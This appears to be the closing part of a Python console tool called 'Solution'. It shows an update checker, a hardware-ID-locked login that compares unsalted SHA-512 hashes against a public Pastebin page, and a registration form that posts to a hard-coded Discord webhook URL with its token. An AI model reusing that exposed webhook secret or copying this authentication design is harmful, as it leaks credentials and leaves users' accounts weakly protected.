            input(f"{fblue}╔════[Press Enter to Return to Main]\n╚══► {cyan}")
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "20":
        try:
            print(reset)
            os.system("cls")
            os._exit(1)
            exit()
        except:
            print(reset)
            os.system("clear")
            os._exit(1)
            exit()
    elif choice == "%":
        import webbrowser
        new = 2
        url = "https://discord.gg/T37sCUVgS6"
        webbrowser.open(url, new=new)
        try:
            os.system("cls")
        except:
            os.system("clear")
        menu()
    elif choice == "00":
        try:
            print(reset)
            os.system("cls")
            os._exit(1)
            exit()
        except:
            print(reset)
            os.system("clear")
            os._exit(1)
            exit()
    else:
        menu()

# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<LOGIN STUFF>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

def checkforupdate():
    recentdownloadlink = infokekr[2]
    if not str(versionnumber) == infokekr[1]:
        print(versionnumber)
        print(infokekr[1])
        download = input(f"{red}VERSION OUTDATED! Download Recent? {reset}y{red}/{reset}n").lower()
        if "y" in download:
            from tqdm.auto import tqdm
            eg_link = f"{recentdownloadlink}"
            eg_file = eg_link.split('/')[-1]
            response = requests.get(eg_link, stream=True)
            with tqdm.wrapattr(open(eg_file, "wb"), "write", miniters=1,
                            total=int(response.headers.get('content-length', 0)),
                            desc=eg_file) as fout:
                for chunk in response.iter_content(chunk_size=4096):
                    fout.write(chunk)
            print(f"{green}Successfully downloaded. Press enter to exit")
            input()
            os._exit(1)
            exit()
        else:
            os._exit(1)
            exit()
    else:
        print(f"{green} Newest Verion installed.")
        time.sleep(1)
        login()


def checkusername():
    hashuser = hashlib.sha512(username.encode())
    hasheduser = hashuser.hexdigest()
    hcxr = requests.get("https://pastebin.com/raw/htHHP5tA")
    if hasheduser in hcxr.text:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] '{username}' Is Already taken!")
        time.sleep(2)
        login()
    else:
        pass


def login():
    printlogo()
    ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Login Page")
    try:
        rpc.update(state="🌌Login Page", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    global username, expiryremaining, userrank
    PrintLinearGradient("#0400ff", "#00ffdd","║   [1] Login     [2] Register    [3] Discord   ║")
    PrintLinearGradient("#0400ff", "#00ffdd","╚══════════════✶ Made by Tooreex ✶══════════════╝")
    try:
        loginpagechoice = input(f"{fblue}\n╔════[root@solution]\n╚══► {cyan}")
    except KeyboardInterrupt:
        login()
    if loginpagechoice == "1":
        hashhwid = hashlib.sha512(hwid.encode())
        hashedhwid = hashhwid.hexdigest()
        username = input(f"{fblue}╔════[Enter Username]\n╚══► {cyan}")
        password = stdiomask.getpass(f"{fblue}╔════[Enter Password]\n╚══► {cyan}")
        hashuser = hashlib.sha512(username.encode())
        hasheduser = hashuser.hexdigest()
        hashpass = hashlib.sha512(password.encode())
        hashedpass = hashpass.hexdigest()
        getallinfoss = requests.get("https://pastebin.com/raw/htHHP5tA")
        if hasheduser in getallinfoss.text:
            try:
                text = getallinfoss.text
                w = open("rundowntemp.txt", "w+")
                w.write(text)
                w.close()
                with open("rundowntemp.txt") as f:
                    for line in f:
                        if hasheduser in line:
                            getuserinfo = line
                os.remove("rundowntemp.txt")
                userinfo = getuserinfo.split(":")
                try:
                    database_password = userinfo[1]
                    databasehwid = userinfo[2]
                    userrank = userinfo[3]
                    userexpiry = userinfo[4]
                    if hashedpass == database_password and hashedhwid == databasehwid:
                        pass
                    else:
                        print(f"[{red}ERROR{reset}] Wrong Info.") 
                        time.sleep(1)
                        login()
                    try: 
                        # checking if expiry still available
                        daymonthyear = userexpiry.split("/")
                        day = int(daymonthyear[0])
                        month = int(daymonthyear[1])
                        year = int(daymonthyear[2])
                        dateone = date(year, month, day)
                        currentday = int(datetime.today().strftime('%d'))
                        currentmonth = int(datetime.today().strftime('%m'))
                        currentyear = int(datetime.today().strftime('%Y'))
                        datetwo = date(currentyear, currentmonth, currentday)
                        remaininglicensedays = dateone - datetwo
                        expiryremaining = remaininglicensedays.days
                        if currentday > day and currentmonth > month and currentyear > year or int(remaininglicensedays.days) < 1:
                            print(f"[{red}ERROR{reset}] Your account is Expired!")
                        else:
                            PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► Welcome back, {username}!")
                            time.sleep(1.5)
                            menu() 
                    except Exception as e:
                        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] POSSIBLE BREACH DEDECTED. EXITING!")
                        print(e)
                        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] report this bug immediately to Nico.#1559")
                        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] otherwise your license will be removed.")
                        time.sleep(2)
                        input("")
                        os._exit(1)
                        exit(1)
                except:
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Failed Loading Database.")
                    time.sleep(2)
                    login()
            except:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Failed Loading Database.")
                time.sleep(2)
                login()
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] User not found / registered")
            time.sleep(2)
            login()
    elif loginpagechoice == "2":
        username = input(f"{fblue}╔════[Enter Username]\n╚══► {cyan}")
        username2 = input(f"{fblue}╔════[ReEnter Username]\n╚══► {cyan}")
        if len(username) < 3:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Username Must Contain 3Characters!")
            time.sleep(2)
            login()
        else:
            pass
        checkusername()
        if username == username2:
            password = stdiomask.getpass(f"{fblue}╔════[Enter Password]\n╚══► {cyan}")
            password2 = stdiomask.getpass(f"{fblue}╔════[ReEnter Password]\n╚══► {cyan}")
            if password == password2:
                discordid = input(f"{fblue}╔════[Enter Discord Name]\n╚══► {cyan}")
                discordid2 = input(f"{fblue}╔════[ReEnter Discord Name]\n╚══► {cyan}")
                if discordid == discordid2:
                    try:
                        hashuser = hashlib.sha512(username.encode())
                        hasheduser = hashuser.hexdigest()
                        hashpass = hashlib.sha512(password.encode())
                        hashedpass = hashpass.hexdigest()
                        hashhwid = hashlib.sha512(hwid.encode())
                        hashedhwid = hashhwid.hexdigest()
                        try:
                            webhooksent = requests.post(f"https://discord.com/api/webhooks/898023381469892668/b-mKLVmGrbhPHUiRqREgvAZo-T-0mW4-Y2T3rzvcdTLfYDX-7QZHBDpj1_p2kT3Ck8Uu", json={'content': f"New register!\n ```{hasheduser}:{hashedpass}:{hashedhwid}:REPLACE_THIS_WITH_RANK:REPLACE_THIS_WITH_EXPIRY(day/month/year):{discordid}```"})
                            if webhooksent.status_code == 204:
                                PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► Registration Sent!")
                                time.sleep(2)
                                printlogo()
                                PrintLinearGradient("#0400ff", "#00ffdd", "║   Unfortunatly, Account Registration is Not   ║")
                                PrintLinearGradient("#0400ff", "#00ffdd", "║    Yet Fully Automated so, You Will NOT be    ║")
                                PrintLinearGradient("#0400ff", "#00ffdd", "║     Able to Sign in Yet,  Please Refer to     ║") 
                                PrintLinearGradient("#0400ff", "#00ffdd", "║    Your Ticket, A Admin Will Tell You When    ║")
                                PrintLinearGradient("#0400ff", "#00ffdd", "║      You Have Been Added to the Database      ║")
                                PrintLinearGradient("#0400ff", "#00ffdd", "╚══════════════✶ Made by Tooreex ✶══════════════╝")
                                input(f"{fblue}\n╔════[Press Enter to Return to the Login Page]\n╚══► {cyan}")
                                login()
                            else:
                                print(webhooksent.status_code)
                                print(webhooksent.text)
                                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] please report this to Nico.#1559")
                                input()
                                menu() 
                        except Exception as e:
                            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
                            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] please report this to Nico.#1559")
                            time.sleep(2)
                            input()
                            menu()
                    except:
                        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] please report this to Nico.#1559")
                        input()
                        login()
                else:
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] The Discord Names are not the same!")
                    time.sleep(2)
                    login()
            else:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] The Passwords are not the same!")
                time.sleep(2)
                login()
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] The Usernames are not the same!")
            time.sleep(2)
            login()
    elif loginpagechoice == "3":
        import webbrowser
        new = 2
        url = "https://discord.gg/T37sCUVgS6"
        webbrowser.open(url, new=new)
        try:
            os.system("cls")
        except:
            os.system("clear")
        login()
    else:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Option!")
        time.sleep(2)
        login()
        
if __name__ == "__main__":
    checkforupdate()
